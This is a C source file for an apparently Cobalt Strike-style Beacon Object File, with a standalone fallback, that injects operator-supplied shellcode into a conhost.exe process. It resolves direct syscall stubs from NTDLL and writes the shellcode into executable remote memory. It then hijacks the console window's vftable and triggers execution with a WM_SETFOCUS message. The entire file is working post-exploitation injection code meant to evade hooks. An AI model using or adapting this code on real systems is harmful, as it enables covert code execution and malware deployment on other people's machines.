#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"

typedef struct _vftable_t {
    ULONG_PTR     EnableBothScrollBars;
    ULONG_PTR     UpdateScrollBar;
    ULONG_PTR     IsInFullscreen;
    ULONG_PTR     SetIsFullscreen;
    ULONG_PTR     SetViewportOrigin;
    ULONG_PTR     SetWindowHasMoved;
    ULONG_PTR     CaptureMouse;
    ULONG_PTR     ReleaseMouse;
    ULONG_PTR     GetWindowHandle;
    ULONG_PTR     SetOwner;
    ULONG_PTR     GetCursorPosition;
    ULONG_PTR     GetClientRectangle;
    ULONG_PTR     MapPoints;
    ULONG_PTR     ConvertScreenToClient;
    ULONG_PTR     SendNotifyBeep;
    ULONG_PTR     PostUpdateScrollBars;
    ULONG_PTR     PostUpdateTitleWithCopy;
    ULONG_PTR     PostUpdateWindowSize;
    ULONG_PTR     UpdateWindowSize;
    ULONG_PTR     UpdateWindowText;
    ULONG_PTR     HorizontalScroll;
    ULONG_PTR     VerticalScroll;
    ULONG_PTR     SignalUia;
    ULONG_PTR     UiaSetTextAreaFocus;
    ULONG_PTR     GetWindowRect;
} ConsoleWindow;

// Given the PID for a console process,
// return the PID for the corresponding conhost.exe child process
DWORD GetConhostId(DWORD dwPPid)
{
    HANDLE hSnap = NULL;
    PROCESSENTRY32 pe32;
    DWORD dwPid = 0;
    
    // Create a toolhelp snapshot
    hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(INVALID_HANDLE_VALUE == hSnap) { goto end; }
    
    intZeroMemory(&pe32, sizeof(pe32));
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process
    if(KERNEL32$Process32First(hSnap, &pe32))
    {
        do
        {
            // Check current process name
            if ( 0 == MSVCRT$_stricmp("conhost.exe", pe32.szExeFile))
            {
                //internal_printf("conhost.exe found with PID:%lu and PPID:%lu\n", pe32.th32ProcessID, pe32.th32ParentProcessID);
                // Is this the child of our parent process?
                if (dwPPid == pe32.th32ParentProcessID )
                {
                    // We found the conhost of our process
                    // Return the process ID
                    dwPid = pe32.th32ProcessID;
                    break;
                }
            }
        } while(KERNEL32$Process32Next(hSnap, &pe32));
    }

end:
    if( (NULL != hSnap) && (INVALID_HANDLE_VALUE != hSnap) )
    { 
        KERNEL32$CloseHandle(hSnap); 
        hSnap = NULL;
    }

    return dwPid;
}

DWORD conhost(PROCESS_INFORMATION* lpProcessInfo, LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HWND hWnd = NULL;
    DWORD dwParentProcessId = 0;
    DWORD dwProcessId = 0;
    PHMOD hNTDLL = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtReadVirtualMemory_t NtReadVirtualMemory = NULL;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = NULL;
    NtFreeVirtualMemory_t NtFreeVirtualMemory = NULL;
    SIZE_T RegionSize = 0;
    LPVOID lpRemoteShellcodeBuffer = NULL;
    LPVOID lpRemoteVTableBuffer = NULL;
    ConsoleWindow consoleWindow;
    LPVOID lpUserData = NULL;
    LPVOID lpvfTable = NULL;
 
 /*
    internal_printf("hThread:               %p\n", lpProcessInfo->hThread);
    internal_printf("hProcess:              %p\n", lpProcessInfo->hProcess);
    internal_printf("dwProcessId:           %u\n", lpProcessInfo->dwProcessId);
    internal_printf("dwThreadId:            %u\n", lpProcessInfo->dwThreadId);
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtReadVirtualMemory = (NtReadVirtualMemory_t)GetSyscallStub(hNTDLL, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    if ((NULL == NtAllocateVirtualMemory) || 
        (NULL == NtReadVirtualMemory) || 
        (NULL == NtWriteVirtualMemory) || 
        (NULL == NtFreeVirtualMemory)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Loop through all the console processes trying to find our target
    do
    {
        hWnd = USER32$FindWindowExA(NULL, hWnd, "ConsoleWindowClass", NULL);
        if ( NULL == hWnd ) { break; }
        USER32$GetWindowThreadProcessId(hWnd, &dwParentProcessId);
        dwProcessId = GetConhostId(dwParentProcessId);
        if ( 0 == dwProcessId )
        {
            continue;
        }
        internal_printf("conhost.exe PID:%lu with PPID:%lu\n", dwProcessId, dwParentProcessId);
    }
    while (dwProcessId != lpProcessInfo->dwProcessId);
    
    if (NULL == hWnd)
    {
        dwErrorCode = ERROR_INVALID_WINDOW_HANDLE;
        internal_printf("Failed to find a ConsoleWindowClass window handle for PID:%lu\n", lpProcessInfo->dwProcessId);
        goto end;
    }

#ifdef _WIN64
    lpUserData = (LPVOID)USER32$GetWindowLongPtrA(hWnd, GWLP_USERDATA);
#else
    lpUserData = (LPVOID)USER32$GetWindowLongA(hWnd, GWLP_USERDATA);
#endif
    if (NULL == lpUserData)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("GetWindowLongPtrA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the current vftable pointer from the remote process
    dwErrorCode = NtReadVirtualMemory(
        lpProcessInfo->hProcess, 
        lpUserData, 
        (LPVOID)&lpvfTable, 
        sizeof(LPVOID), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the vftable from the remote process
    intZeroMemory(&consoleWindow, sizeof(consoleWindow));
    dwErrorCode = NtReadVirtualMemory(
        lpProcessInfo->hProcess, 
        lpvfTable, 
        &consoleWindow, 
        sizeof(consoleWindow), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate the remote shellcode buffer
    RegionSize = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        lpProcessInfo->hProcess, 
        &lpRemoteShellcodeBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the local shellcode to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpRemoteShellcodeBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the local vftable to point to the shellcode
    consoleWindow.GetWindowHandle = (ULONG_PTR)lpRemoteShellcodeBuffer;

    // Allocate a remote buffer for the new vftable
    RegionSize = sizeof(consoleWindow) + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        lpProcessInfo->hProcess, 
        &lpRemoteVTableBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the local vftable to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpRemoteVTableBuffer, 
        &consoleWindow, 
        sizeof(consoleWindow), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the remote vftable pointer to point to the new remote vftable
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpUserData, 
        &lpRemoteVTableBuffer, 
        sizeof(ULONG_PTR), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Trigger execution
    USER32$SendMessageA(hWnd, WM_SETFOCUS, 0, 0);

    KERNEL32$Sleep(10);

    // Restore the vftable pointer in the remote process
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpUserData, 
        &lpvfTable, 
        sizeof(ULONG_PTR), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

end:
    // Free remote kernel callback table
    if (lpRemoteVTableBuffer)
    {
        NtFreeVirtualMemory(
            lpProcessInfo->hProcess, 
            lpRemoteVTableBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteVTableBuffer = NULL;
    }

    // Free remote shellcode?
    /*
    if (lpRemoteShellcodeBuffer)
    {
        NtFreeVirtualMemory(
            lpProcessInfo->hProcess, 
            lpRemoteShellcodeBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteShellcodeBuffer = NULL;
    }
    */

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
    
    // Get the arguments <PID> <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    dwPid = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Get a handle to the injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("conhost( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = conhost(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "conhost failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Check to see if we received any arguments
    if (3 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }

    // Get the arguments <PID> <SHELLCODE>
    dwPid = atoi(argv[1]);
    if (USHRT_MAX < dwPid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PID: %s\n", argv[1]);
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }
    
    dwErrorCode = ReadFileIntoBuffer(argv[2], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to our injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("conhost( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = conhost(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "conhost failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
